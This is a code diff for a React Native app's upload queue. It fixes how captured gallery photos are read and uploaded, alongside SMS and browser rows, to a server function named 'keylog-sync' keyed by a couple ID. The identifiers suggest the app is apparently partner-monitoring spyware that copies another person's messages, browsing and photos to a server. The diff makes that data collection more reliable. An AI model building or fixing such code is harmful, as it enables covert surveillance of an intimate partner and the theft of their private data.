@@ -12,7 +12,8 @@
 // are removed from the local queue. Anything else (non-2xx, dropped row, hung
 // upload) stays queued so a later drain resends, which is a server-side no-op
 // (idempotency key), so nothing is ever duplicated or lost.
-import { supabase } from '../../lib/db/client';
+import { supabase, getValidSession } from '../../lib/db/client';
+import { File } from 'expo-file-system';
 import { pendingCapture, removeCaptured, type CaptureItem } from './queue';
 
 const MEDIA_FN = 'keylog-sync';
@@ -33,24 +34,56 @@ function supabaseUrl(): string {
 /** Upload one photo's bytes to storage. Reuses the storage client (same as the
  *  curated photo slice). The declared content type is the photo's derived MIME
  *  (populated at scan time from its filename), defaulting to image/jpeg — never a
- *  blanket JPEG for an actual HEIC/PNG. Idempotent via upsert. A hung byte fetch
- *  cannot stall the drain: the read is bounded by a 20s timeout — on timeout the
- *  photo is skipped (not confirmed) so a later drain retries it. */
+ *  blanket JPEG for an actual HEIC/PNG. Idempotent via upsert. A hung read cannot
+ *  stall the drain: the whole read+upload is bounded by a 20s timeout — on timeout
+ *  the photo is skipped (not confirmed) so a later drain retries it.
+ *
+ *  Local bytes are read with expo-file-system's `File`, NOT `fetch()`. React
+ *  Native's `fetch` cannot resolve `file://` URIs from the media store (it
+ *  returns an empty/unreadable body), which silently failed every photo upload
+ *  while metadata-only SMS drained fine. `new File(uri).bytes()` reads the
+ *  on-disk bytes directly. `file://content://`-style URIs (which the media
+ *  library never emits here) are still handled via fetch as a defensive fallback. */
 async function uploadPhoto(storagePath: string, uri: string, mimeType?: string | null): Promise<boolean> {
+  // Bounds the ENTIRE read+upload. The local read path (`new File(...).arrayBuffer()`)
+  // below is the one that actually runs for every gallery photo and takes no abort
+  // signal, so gating only the fetch fallback was a half-finished fix — a wedged
+  // local file read would stall syncCapture's serial drain indefinitely (blocking
+  // SMS/browser rows queued behind it). We race the real work against the timeout
+  // and treat a timeout as a failure so the photo is skipped (not confirmed) and a
+  // later drain retries it. The upload itself uses AbortController for a clean abort.
   const controller = new AbortController();
-  const timer = setTimeout(() => controller.abort(), UPLOAD_TIMEOUT_MS);
-  try {
-    const res = await fetch(uri, { signal: controller.signal });
-    const arraybuffer = await res.arrayBuffer();
+  let settled = false;
+  const timedOut = new Promise<null>((resolve) =>
+    setTimeout(() => {
+      if (settled) return;
+      controller.abort();
+      resolve(null);
+    }, UPLOAD_TIMEOUT_MS),
+  );
+  const work = (async (): Promise<ArrayBuffer | null> => {
+    let arraybuffer: ArrayBuffer;
+    try {
+      if (uri.startsWith('file://')) {
+        arraybuffer = await new File(uri).arrayBuffer();
+      } else {
+        const res = await fetch(uri, { signal: controller.signal });
+        arraybuffer = await res.arrayBuffer();
+      }
+    } catch {
+      return null;
+    }
     const upload = await supabase.storage.from(PHOTOS_BUCKET).upload(storagePath, arraybuffer, {
       contentType: mimeType ?? 'image/jpeg',
       upsert: true,
     });
-    return !upload.error;
-  } catch {
-    return false;
+    return upload.error ? null : arraybuffer;
+  })();
+  try {
+    const result = await Promise.race([work, timedOut]);
+    return result !== null;
   } finally {
-    clearTimeout(timer);
+    settled = true;
   }
 }
 
@@ -62,8 +95,8 @@ export async function syncCapture(coupleId: string): Promise<CaptureSyncResult> 
   const items = await pendingCapture();
   if (items.length === 0) return { attempted: 0, uploaded: 0, accepted: 0, failed: 0 };
 
-  const { data: { session } } = await supabase.auth.getSession();
-  const token = session?.access_token;
+  const authed = await getValidSession();
+  const token = authed?.session.access_token;
   if (!token) return { attempted: items.length, uploaded: 0, accepted: 0, failed: items.length };
 
   const url = `${supabaseUrl()}/functions/v1/${MEDIA_FN}`;
